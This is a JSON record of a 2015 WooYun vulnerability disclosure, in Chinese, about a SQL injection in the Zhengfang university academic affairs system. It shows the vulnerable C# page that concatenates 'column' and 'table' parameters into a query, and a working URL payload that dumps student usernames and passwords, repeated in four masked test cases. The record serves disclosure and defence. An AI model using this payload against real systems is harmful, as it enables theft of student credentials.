{"id": 84766, "wybug_id": "wooyun-2015-0142558", "wybug_title": "正方教务系统任意执行select语句,轻松获取账户密码", "wybug_corp": "正方教务", "wybug_author": "error", "wybug_date": "2015-09-24 13:07", "wybug_open_date": "2015-12-28 09:24", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "已交由第三方合作机构(cncert国家互联网应急中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["安全意识不足", "注射漏洞利用技巧"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-09-24：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-09-29：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-10-02：\t细节向第三方安全合作伙伴开放（绿盟科技、唐朝安全巡航）\t\t\t\t\t\t\t\t\t2015-11-23：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-12-03：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-12-13：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-12-28：\t细节向公众公开  简要描述： 正方教务系统某处可任意执行select语句，轻松获取账户密码 详细说明：  http://**.**.**.**/index.htmlhttp://**.**.**.**/type_al/0400000103.html共三十个省、市、自治区1000多所高校国内几乎有使用教务系统的学校有%70是正方教务系统漏洞页面：/ResultXml_common.aspx漏洞源码：\nprivate void Page_Load(object sender, EventArgs e)    {        string xml = \"\";        string k = \"\";        k = this.Request.QueryString[\"k\"];        string table = this.Request.QueryString[\"table\"];        string column = this.Request.QueryString[\"column\"];        if (StringType.StrCmp(k, \"\", false) != 0)        {            xml = \"<?xml version='1.0' encoding='gb2312'?>\";            xml = xml + \"<data><d><![CDATA[\";            k = k.Replace(\"'\", \"''\");            string sql = \"select distinct \" + column + \" from \" + table + \" where \" + column + \" like '\" + k + \"%'\";            mmtp zhj = new mmtp();            OracleConnection conn = new OracleConnection(ConfigurationSettings.AppSettings[\"MyConn\"] + zhj.jiemi(ConfigurationSettings.AppSettings[\"MyPwd\"], zhj.str_jm));            OracleCommand comm = new OracleCommand(sql, conn);            conn.Open();            OracleDataReader dr = comm.ExecuteReader();            while (dr.Read())            {                xml = xml + \"<div onclick='setContent(this.innerHTML)' onmouseover='ChangeColor(this)' onmouseout='Back(this)'>\" + dr[0].ToString() + \"</div>\";            }            dr.Close();            comm.Dispose();            conn.Close();            xml = xml + \"]]></d></data>\";        }        this.Response.ContentType = \"text/xml\";        this.Response.ContentEncoding = Encoding.GetEncoding(\"gb2312\");        this.Response.Clear();        this.Response.Write(xml);        this.Response.End();    }}\n通过column参数和table参数，可以任意执行SELECT查询！，由于select语句分割在两个参数中，因此也可以绕过内置的SQL注入检测。   漏洞证明：  Payload:\n/ResultXml_common.aspx?k=%&column='[username='||xh||']['||'passwd='||mm||']'&table=xsjbxxb+where+rownum<=10--\n测试案例：（1）http://**.**.**.**/http://**.**.**.**/ResultXml_common.aspx?k=%&column='[username='||xh||']['||'passwd='||mm||']'&table=xsjbxxb+where+rownum<=30--\n\n（2）http://**.**.**.**http://**.**.**.**/ResultXml_common.aspx?k=%&column='[username='||xh||']['||'passwd='||mm||']'&table=xsjbxxb+where+rownum<=30--\n\n（3）http://**.**.**.**/http://**.**.**.**/ResultXml_common.aspx?k=%&column='[username='||xh||']['||'passwd='||mm||']'&table=xsjbxxb+where+rownum+<+30--\n\n（4）**.**.**.**/**.**.**.**/ResultXml_common.aspx?k=%&column='[username='||xh||']['||'passwd='||mm||']'&table=xsjbxxb+where+rownum+<+30--\n\n    修复方案：  过滤   版权声明：转载请注明来源 error@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：14  确认时间：2015-09-29 09:22 厂商回复： CNVD确认并复现所述情况，已由CNVD通过软件生产厂商公开联系渠道向其邮件通报，由其后续提供解决方案并协调相关用户单位处置。  最新状态： 暂无  ", "replys": "漏洞评价：\n评价\n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 14, "Ranks": null}